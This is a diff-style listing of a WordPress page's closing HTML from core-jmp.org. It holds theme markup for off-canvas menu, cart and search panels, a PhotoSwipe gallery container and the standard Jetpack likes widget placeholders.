+    <div class="aux-hidden-blocks">
+
+        <section id="offmenu" class="aux-offcanvas-menu aux-pin-left">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="offcanvas-header">
+            </div>
+            <div class="offcanvas-content">
+            </div>
+            <div class="offcanvas-footer">
+            </div>
+        </section>
+        <!-- offcanvas section -->
+
+        <section id="offcart" class="aux-offcanvas-menu aux-offcanvas-cart aux-pin-left">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="offcanvas-header">
+                Shopping Basket            </div>
+            <div class="aux-cart-wrapper aux-elegant-cart aux-offcart-content">
+            </div>
+        </section>
+        <!-- cartcanvas section -->
+
+                <section id="fs-menu-search" class="aux-fs-popup  aux-fs-menu-layout-center aux-indicator">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="aux-fs-menu">
+                        </div>
+            <div class="aux-fs-search">
+                <div class="aux-search-section ">
+                <div class="aux-search-form ">
+            <form action="https://core-jmp.org/" method="get">
+            <div class="aux-search-input-form">
+                            <input type="text" class="aux-search-field" placeholder="Type here.." name="s" autocomplete="off">
+                                    </div>
+                            <input type="submit" class="aux-black aux-search-submit aux-uppercase" value="Search">
+                        </form>
+        </div><!-- end searchform -->
+                </div>
+
+            </div>
+        </section>
+        <!-- fullscreen search and menu -->
+                <section id="fs-search" class="aux-fs-popup aux-search-overlay  has-ajax-form">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="aux-search-field">
+
+            <div class="aux-search-section aux-404-search">
+                <div class="aux-search-form aux-iconic-search">
+            <form action="https://core-jmp.org/" method="get">
+            <div class="aux-search-input-form">
+                            <input type="text" class="aux-search-field" placeholder="Search..." name="s" autocomplete="off">
+                                    </div>
+                            <div class="aux-submit-icon-container auxicon-search-4 ">
+                                        <input type="submit" class="aux-iconic-search-submit" value="Search">
+                </div>
+                        </form>
+        </div><!-- end searchform -->
+                </div>
+
+            </div>
+        </section>
+        <!-- fullscreen search-->
+
+        <div class="aux-scroll-top"></div>
+    </div>
+
+    <div class="aux-goto-top-btn aux-align-btn-right" style="display: block; transform: translateY(150px);"><div class="aux-hover-slide aux-arrow-nav aux-round aux-outline">    <span class="aux-overlay"></span>    <span class="aux-svg-arrow aux-h-small-up"></span>    <span class="aux-hover-arrow aux-svg-arrow aux-h-small-up aux-white"></span></div></div>
+<!-- outputs by wp_footer -->
+
+
+	
+				
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true"><div class="pswp__bg"></div><div class="pswp__scroll-wrap"><div class="pswp__container"><div class="pswp__item"></div><div class="pswp__item"></div><div class="pswp__item"></div></div><div class="pswp__ui pswp__ui--hidden"><div class="pswp__top-bar"><div class="pswp__counter"></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button><button class="pswp__button pswp__button--share" title="Share"></button><button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button><button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class="pswp__preloader"><div class="pswp__preloader__icn"><div class="pswp__preloader__cut"><div class="pswp__preloader__donut"></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class="pswp__share-tooltip"></div> </div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button><button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class="pswp__caption"><div class="pswp__caption__center"></div></div></div></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+	<div src="https://widgets.wp.com/likes/master.html?ver=20260426#ver=20260426" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">
+
+
+
+
+
+
+</div></div>
+	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+	<!-- end wp_footer -->
+
+
+</body></html>
